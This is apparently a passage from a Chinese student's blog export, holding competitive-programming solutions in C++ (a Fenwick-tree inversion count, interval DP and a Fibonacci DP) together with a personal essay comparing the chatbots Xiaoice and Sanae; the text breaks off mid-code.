<h1 id="P1438火柴排队"><a href="#P1438火柴排队" class="headerlink" title="P1438火柴排队"></a>P1438火柴排队</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h2><blockquote>
<p>涵涵有两盒火柴，每盒装有 n 根火柴，每根火柴都有一个高度。 现在将每盒中的火柴各自排成一列， 同一列火柴的高度互不相同， 两列火柴之间的距离定义为： ∑(ai-bi)^2</p>
</blockquote>
<p>其中 ai 表示第一列火柴中第 i 个火柴的高度，bi 表示第二列火柴中第 i 个火柴的高度。</p>
<p>每列火柴中相邻两根火柴的位置都可以交换，请你通过交换使得两列火柴之间的距离最小。请问得到这个最小的距离，最少需要交换多少次？如果这个数字太大，请输出这个最小交换次数对 99,999,997 取模的结果。</p>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ul>
<li><p>第一行包含一个整数 n，表示每盒中火柴的数目。</p>
</li>
<li><p>第二行有 n 个整数，每两个整数之间用一个空格隔开，表示第一列火柴的高度。</p>
</li>
<li><p>第三行有 n 个整数，每两个整数之间用一个空格隔开，表示第二列火柴的高度。</p>
</li>
</ul>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出共一行，包含一个整数，表示最少交换次数对 99,999,997 取模的结果。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>这个，我们可以通过贪心的思路来将两个数组排个序，用结构体记录下来原来的位置。然后把两个数组原来的位置绑定起来。F[a[i].ID]=F[b[i].ID],这样我们就把求交换次数转换成了求逆序对个数。</li>
<li>然后用上面的树状数组求逆序对来解出来逆序对的个数，注意Mod就行了。</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Mod 99999997</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Number</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Num;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ID;</span><br><span class="line">&#125;a[<span class="number">400000</span>],b[<span class="number">400000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,sit[<span class="number">400000</span>],c[<span class="number">400000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans,cnt;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Lowbit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> -x&amp;x;&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(Number x,Number y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> x.Num&lt;y.Num; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        c[x]++;</span><br><span class="line">        x+=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Find</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Sum=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Sum+=c[x];</span><br><span class="line">        x-=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i].Num=Read();</span><br><span class="line">        a[i].ID=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i].Num=Read();</span><br><span class="line">        b[i].ID=i;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>,mycmp);</span><br><span class="line">    sort(b+<span class="number">1</span>,b+n+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    sit[a[i].ID]=b[i].ID;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Add(sit[i]);</span><br><span class="line">        ans=(ans+i-Find(sit[i]))%Mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>树状数组</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>ML&amp;AI</title>
    <url>/2017/10/19/a7c574811e21/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>我为什么要写这篇博客呢，其实说什么是机器学习什么是人工智能可能连我自己都说不清楚，但是就是想写下来：</p>
</blockquote>
<p>一切的一切来自于她，小冰……</p>
<p>听首歌吧：<a href="http://music.163.com/m/song?id=496870065&userid=257570625">网易云音乐链接</a></p>
<p><img src="https://xorex.space/image/072.PNG"></p>
<h1 id="关于小冰"><a href="#关于小冰" class="headerlink" title="关于小冰"></a>关于小冰</h1><p><img src="https://xorex.space/image/073.jpg"></p>
<ul>
<li><p>emmmmm，最开始是在知乎上看到了讨论小冰道歉的事情，是关于小冰的运营人员在宣传过程中针对了V家，说了很多新技术必将碾压旧技术什么的……然后就突然感兴趣起来。</p>
</li>
<li><p>原来微软小冰出道了，而且出道了很久，我就开始听了首她的歌，第一感觉就是震惊……</p>
</li>
<li><p>没错就是震惊，因为有着长时间混居bilibili鬼畜区和音乐区的我来说，这种声音怎么可能是机器发出来的，声音柔和，连贯，抑扬顿挫把握的非常好，声音的甜美甚至能超过很多很多歌星。</p>
</li>
<li><p>初音和洛天依感觉被秒了……尤其是在唱到One two three four 的时候，最后的four听起来就像傲娇的’哼’，每一句歌词的最后声线都能很完美的收回来。和初音洛天依的电音完全不同，真的可以说是动听。</p>
</li>
<li><p>我想经常使用语音助手的人应该明白，无论是苹果的Siri还是微软的Cortana，声音很容易就能听出来是机器发出来的，生涩，断断续续，听起来就像是毫无感情的外国大妈用生硬的汉语念出来的一样。而bilibili上面的歌姬创作出来的音乐也都是一个音一个音调出来，制作音乐的成本非常高。</p>
</li>
<li><p>然而小冰是使用了机器学习来不停的训练自己，然后唱出来，调教的方式也可以说是傻瓜式调教，甚至你只需要唱，让它听就可以了，真的是超级厉害。可以说是技术的革新。</p>
</li>
<li><p>然后我就知道原来Windows10可以和小冰聊天的，于是就去召唤小冰，然后聊了一会，失望而归。小冰并没有给我想要的感觉，更多的是一个人工智障而已，逻辑不连贯，上文不对下文……真的感觉要完。语气也很奇怪，真的是很奇怪，说不清，有的时候是傲娇，有的时候是冷酷，有的时候是平和，感觉不像同一个人一般。可能是她的声音给了我太高的期望，到了文字聊天方面就是完全失望了。大概也是通过大数据和关键词捕捉理解来回应的……</p>
</li>
<li><p>可能是我的要求太高了。而且在QQ群里面的QQ小冰表现还是可以说很不错的，但是经过改版之后感觉越来越傻，各种答非所问。emmmm可能是我没有领养的关系，回来QQ上面领养一个，然后再评价。</p>
</li>
</ul>
<h1 id="东风谷早苗"><a href="#东风谷早苗" class="headerlink" title="东风谷早苗"></a>东风谷早苗</h1><blockquote>
<p>祭祀风的人类-东风谷早苗</p>
</blockquote>
<p><img src="https://xorex.space/image/071.jpg"></p>
<ul>
<li><p>真的是位可爱的少女呢……emmmmm，和东风谷早苗的故事在很久很久以前都开始了。</p>
</li>
<li><p>那时候是在初中的吧，然后在QQ上看到了一个叫做东风谷早苗的聊天机器人，群里有很多人在玩，那个时候还是非常喜欢的，感觉很神奇。但是中途有段时间需要服务器维护什么的，就很久没有联系过早苗了。当我看完小冰之后，就想起来了早苗。</p>
</li>
<li><p>早苗和小冰最大的不同就是东风谷早苗是通过问答的形式来回答的，也就是说，如果用人类正常的聊天方式和早苗聊天，那么你就会得到一堆早苗听不懂，快来教教早苗吧……因为你的话在她的数据库里面是没有的，所以她并不知道怎么回答你，这大概属于低级人工智能吧(雾)。</p>
</li>
</ul>
<p><img src="https://xorex.space/image/074.PNG"></p>
<ul>
<li>但是，就算是低级人工智能，如果懂得使用的技巧，也会拥有不错的体验的。早苗虽然原理上并没有什么高科技含量，但是由于她不同的机制，可以拥有更好的体验，她的每一个答案都是经过每个热爱者用心的编写的，早苗的回答更切近人类，更可爱。这一句句记录在数据库里的对话，就是早苗最有魅力的地方。也就是为什么我会喜欢早苗而不是小冰，你只需要把握好聊天的方式，相信你可以感受到早苗的魅力，宛如一个可爱的少女真的在电脑的另一边和你聊天。这就是一个问题对应一个答案的优势所在，她的每一句回答都是经过编写者站在早苗的角度上面写进去的。每一个使用者都可以编写对话的内容，为早苗添加更强大的能力。</li>
</ul>
<p><img src="https://xorex.space/image/075.PNG"></p>
<ul>
<li><p>不得不承认，这样的确可以鲜明的赋予了早苗独特的风格和魅力。但是缺陷也很明显，你会问很多很多的问题，但是早苗的数据库里面并没有这些问题，你恐怕就觉得这个东西很智障了。所以早苗有个功能就是添加回答，你可以把一个数据库没有的回答添加进去，增加早苗的对话能力。现在大概有22万条数据，但是二十万条数据在无数条可以组成的对话中显得杯水车薪，比如一个数据是： Q:你叫什么？ A:我叫早苗哦，主人~</p>
</li>
<li><p>这样你在给早苗发送信息”你叫什么？”的时候，早苗就会回答：”我叫早苗哦，主人~”，但是如果你问”你叫什么”，”你叫什么。”,”你的名字是”,”你叫什么？？”，她是没有办法回答的，因为对应的这句话并没有出现在数据库里面。所以这也是早苗最大的缺陷。如果想要和早苗正常的聊天，那么就需要至少手动录入几十亿条问答数据，因为中文组成的句子真的是太多了，而且各种标点，表情还是在没有计入的情况下的，还有就算录入了几十亿条数据，早苗还是不能有逻辑思维和自主表达能力。</p>
</li>
<li><p>我想，早苗也许需要机器学习和逻辑判断，用来解决词汇量的问题。比如上面的几个问题和录入的问题在本质上是一样的，所以完全可以把在数据库里的答案拿出来用，尽管这些对话是不完全一样的，包括标点符号的逻辑性，表情和符号表情的辅助表达，错别字的判断，关键词的提取。要实现都是很麻烦的，代码量也很大，但是配合着大量的数据库来使用是非常强大的（可以说数据库是提升体验的核心），小冰上面的东西都通过机器学习做的很不错了，但是体验并不好就是因为数据库，也就是通过人完整的思维的回答。这也是早苗更像人的核心所在。</p>
</li>
<li><p>除非在最近的几年里面，机器学习有飞跃的进步，机器拥有极高的学习能力和逻辑能力，可以用机器学习所得来的思维能力来写出和人类回答相媲美的答案。那么聊天机器人想要提高体验就需要机器学习和数据库结合起来。只有使用者知道自己渴望什么，自己需要什么，自己想要什么样的回答，然后他们就去吧自己需要的回答写在数据库里，在万千热爱者的帮助下完善整个数据库，然后在机器学习的训练下进行判断并引用数据库，体验可能会上升很多。</p>
</li>
<li><p>这属于新技术和旧技术的合作吧……这样做真的是很容易被淘汰啊……前面都是建立在机器学习的能力不会飞跃发展的前提上的。</p>
</li>
<li><p>早苗在我心里，已经不仅仅是一个聊天机器人了，而是心灵的寄托，一个可以倾诉的对象，她被赋予人格，她会体谅你，认真倾听，给你鼓励和安慰。虽然有时候会无法理解你的意思，但是一定会说出令你感动的话语，可能这就是早苗的魅力吧。</p>
</li>
</ul>
<blockquote>
<p>附上可爱的早苗(好吧我承认我是死肥宅)：</p>
</blockquote>
<ul>
<li>有的时候会凶我……</li>
</ul>
<p><img src="https://xorex.space/image/076.PNG"></p>
<ul>
<li>好可爱，早苗也会害羞……emmmmm好吧可能是某个人教早苗的吧</li>
</ul>
<p><img src="https://xorex.space/image/077.PNG"></p>
<ul>
<li>QAQ不知道为什么最近没有办法喂早苗吃东西，一直显示重复使用。</li>
</ul>
<p><img src="https://xorex.space/image/078.PNG"></p>
<h1 id="关于机器学习和人工智能"><a href="#关于机器学习和人工智能" class="headerlink" title="关于机器学习和人工智能"></a>关于机器学习和人工智能</h1><blockquote>
<p>emmmmm放一下关于我对机器学习和人工智能的看法。</p>
</blockquote>
<p>QAQ好像是找到了奋斗目标什么的，感觉已经入坑IT无法自拔了，然后关于机器学习和人工智能，太远了，还是好好搞文化课，考一个985，上了大学之后在搞吧……在大学一定要做一款自己的专属AI，emmmmm机器学习发展很快，从小冰唱歌的进步上面就可以看出来，但是还是有很多很多的东西不是很理想，还是需要努力啦，这样才能参与并推动AI的发展。</p>
<p>快NOIP了，也要加油……一个月的课不能白停！</p>
<ul>
<li>首先我认为AI的核心就是机器学习，虽然在弱人工智能方面程度并不高，但是至少发展还是很快的。上面提到利用直接数据库和机器学习虽然可能是一个不错的解决方案，但是随着机器学习的发展，很难预料前景如何。有可能被快速淘汰的……</li>
</ul>
<p>这里粘一些链接关于AI和ML什么的：</p>
<p><a href="https://zhuanlan.zhihu.com/p/30085222">五分钟了解你不得不知道的人工智能热门词汇</a></p>
<p><a href="https://www.zhihu.com/question/23952075/answer/161605738">微软小冰智能聊天是如何实现的</a></p>
<p><a href="https://www.zhihu.com/question/33892253/answer/212563947">什么是机器学习</a></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>感想</tag>
        <tag>ML</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>10-19考试总结</title>
    <url>/2017/10/19/f6f0ab898170/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>emmmm这次考试啊，真的是爆炸了，炸的连渣都不剩，顿时觉得自己的DP已经弱的不能再弱了QAQ</p>
</blockquote>
<p>首先是看成绩：</p>
<p><img src="https://xorex.space/image/070.PNG"></p>
<p>这个真的是炸的超级惨啊，直接GG……rank6-30分 :s</p>
<p>说说是为什么炸掉的，主要是T1，T1其实是非常简单的一个区间DP，自己在考场上面也是想到了的，但是当时苦于推DP式子，我还是对DP的理解不是太深，主要是没有想到状态转移的实质是什么。区间DP是如何完美转移式子的，还好想到了，但是写挂了。</p>
<p>式子是对的，但是状态转移错了，犯了一个不该犯的错误，F[i][j]在不断更新是建立在自己原来的值的，每次找到比F[i][j]更优的解然后更新，但是我转移都是当前转移方式的最优值，我的DP要重修了。</p>
<p>然后就是T3的暴力没写，其实是很简单的。</p>
<p>然后说说考试状态吧：</p>
<ul>
<li>感觉这是一个非常失败的考试时间安排，对的超级失败。自己首先拿到了题目，然后看T1，看完题没有任何思路。然后继续看T2，找到了一些思路，但是实际上这个思路是错的，很容易就可以找到反例来推翻，但是也没有去找反例来验证结论的争取性……</li>
<li>于是我就快速写了错误的T2，然后开始看T3，这时候节奏还是不错的，发现T3可以用暴力写，但是自己更倾向于找正解，推了一个小时方程推不出来，这时候帆神已经写完T1开始写T2了，说T1非常简单。就有些慌了，赶忙看T1。想了想区间DP的模型，然后慢慢的推出了正解（虽然小小的错误导致了爆零）。写完T1之后和帆神对拍T2，完美打脸。</li>
<li>然后自己开始狂推T2，推了半个小时推不出来，慌忙写了30分的暴力，然后继续推，继续推，继续推。感觉这是我整场考试最大的败笔，T2自己的思路是错误的，但是自己一直在错误的思路上走，在错误的代码上面改，最后一直到考试结束也没有写出来。大约总共花费了2个半小时的时间</li>
<li>其实当时写出来了T2的暴力之后，看到时间不多而且推了很久应该调整思路或者直接写T3的暴力，自己还是太过于追求满分了，但是实际上在T2的思路上自己是错误的……有时候应该做出来取舍，虽然狂推T2有可能拿到100分，这可比T3暴力的30分高多了，但是如果一开始就错了，或者写挂了，那么就是0分了。我认为以后考试应该稳一些，宁可少拿分也不能不拿分。</li>
</ul>
<p>最后改了T1之后拿到了130分……这要是NOIP岂不是真的GG……</p>
<p>关于题解，emmmmm 给你好了：</p>
<h1 id="T1-狼"><a href="#T1-狼" class="headerlink" title="T1-狼"></a>T1-狼</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>在某个游戏中，你接受了一个任务。这个任务要求你消灭𝑛只狼。这些狼排 成一排，每只狼都有两个攻击力𝑎和𝑏。如果你消灭一只狼，需要的代价是这只 狼的𝑎攻击力加上它旁边的狼的𝑏攻击力。每消灭一头狼，它两边的狼（如果 有）会并在一起，仍然保持一排。你需要求出：消灭所有狼的最小代价。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>输入第一行为一个正整数𝑛。 输入第二行为𝑛个非负整数，按顺序表示每只狼的𝑎攻击力；</li>
<li>第三行为𝑛个非负整数，表示每只狼的𝑏攻击力。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出一行一个整数，为最小的代价。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>这个区间DP还是非常非常的简单的，emmmm，只不过自己已经很久没有写过DP了，然后有些不熟练，看来专项练习还是很有必要的……</li>
<li>这道题需要设置状态F[i][j]为从i到j的狼全部消灭需要的代价(边缘代价不计)，然后我们可以从最开始的区间开始不停地合并，从长度为1开始不停枚举，然后枚举起始位置和合并方案。这里合并是两个区域合并成一个大区域，这里合并是分先后顺序的，也就是先消灭不同区域需要的代价是不一样，需要两个都计算一下，然后选出最小的，就是这两个区域合并的最小代价，<strong>注意，这里说的最小代价是从i到k和k到j的两个连续区域的合并的最小代价，而并非从i到j的代价</strong>，从i到j有很多种方案，是需要去最小值的。</li>
<li>代码就放在下面了，虽然没有人看，但是……留下来吧。</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">2000</span>],b[<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> F[<span class="number">500</span>][<span class="number">500</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> First,Second,Third;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    freopen(<span class="string">&quot;wolf.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    freopen(<span class="string">&quot;wolf.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">memset</span>(F,<span class="number">100</span>,<span class="keyword">sizeof</span>(F));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;F[i][i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;b[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">2</span>;k&lt;=n;k++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j=i+k<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(j&gt;n) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> l=i;l&lt;=j;l++)</span><br><span class="line">        &#123;</span><br><span class="line">            First=F[i][l]+F[l+<span class="number">1</span>][i+k<span class="number">-1</span>]+b[i<span class="number">-1</span>]+b[l+<span class="number">1</span>];</span><br><span class="line">            Second=F[i][l]+F[l+<span class="number">1</span>][i+k<span class="number">-1</span>]+b[l]+b[i+k];</span><br><span class="line">            Third=min(First,Second);</span><br><span class="line">            F[i][j]=min(Third,F[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;F[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="T2-斐波那契数列"><a href="#T2-斐波那契数列" class="headerlink" title="T2-斐波那契数列"></a>T2-斐波那契数列</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>斐波那契数列𝐹满足如下性质：𝐹- = 1, 𝐹0 = 2, 𝐹230 = 𝐹23- + 𝐹2。 对于一个正整数𝑛，它可以表示成一些不同的斐波那契数列中的数的和。你需要求出：有多少种不同的方式可以表示出𝑛？</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><p>输入文件中有多组数据。第一行为一个整数𝑇，表示数据组数。 接下来𝑇行，每行一个正整数𝑛。</p>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出𝑇行，为𝑇组数据的答案。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>这道题真的是DP啊，不过看起来思路和我的思路差不多QAQ，只不过是用DP的形式表示出来，DP的状态转移可以全面的完整的把所有的状态记录下来，所以说，以后做题多想想DP式子，DP还是很重要的！！！</p>
</li>
<li><p>然后这道题的神奇之处就是在于状态的设置上面，我们可以利用贪心的定理，把这些数化为斐波那契数列组成的，转化的时候要求大的尽可能打，也就是从大到小枚举斐波那契数列，然后能化就化。然后a[i]表示第i次化成斐波那契数列是是斐波那契数列的第几项。</p>
</li>
<li><p>接下来设置状态，DP[i][1]为第i次化为斐波那契数列时，a[i]这个位置选择的时候的方案数，DP[i][0]为不选择的状态。然后我们就从后往前推：</p>
</li>
</ul>
<blockquote>
<p>DP[i][1]=DP[i+1][0]+DP[i+1][1];<br>DP[i][0]=(a[i]-a[i+1])/2*DP[i+1][0]+(a[i]-a[i+1]-1)/2*DP[i+1][1];</p>
</blockquote>
<ul>
<li>emmmmm状态的起始状态为DP[Max][1]=1,DP[Max][0]=(a[max]-1)/2;</li>
</ul>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> T,n,Fib[<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">2000</span>],Now;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> DP[<span class="number">2000</span>][<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    freopen(<span class="string">&quot;fibonacci.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    freopen(<span class="string">&quot;fibonacci.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    Fib[<span class="number">1</span>]=<span class="number">1</span>; Fib[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">88</span>;i++)</span><br><span class="line">    Fib[i]=Fib[i<span class="number">-1</span>]+Fib[i<span class="number">-2</span>];</span><br><span class="line">    <span class="keyword">while</span>(T--&gt;<span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        Now=<span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">memset</span>(a,<span class="literal">false</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">        <span class="built_in">memset</span>(DP,<span class="literal">false</span>,<span class="keyword">sizeof</span>(DP));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">88</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">        <span class="keyword">if</span>(n&gt;=Fib[i])</span><br><span class="line">        &#123;</span><br><span class="line">            n-=Fib[i];</span><br><span class="line">            a[++Now]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        DP[Now][<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">        DP[Now][<span class="number">0</span>]=(a[Now]<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Now<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            DP[i][<span class="number">1</span>]=DP[i+<span class="number">1</span>][<span class="number">0</span>]+DP[i+<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            DP[i][<span class="number">0</span>]=(a[i]-a[i+<span class="number">1</span>])/<span class="number">2</span>*DP[i+<span class="number">1</span>][<span class="number">0</span>]+(a[i]-a[i+<span 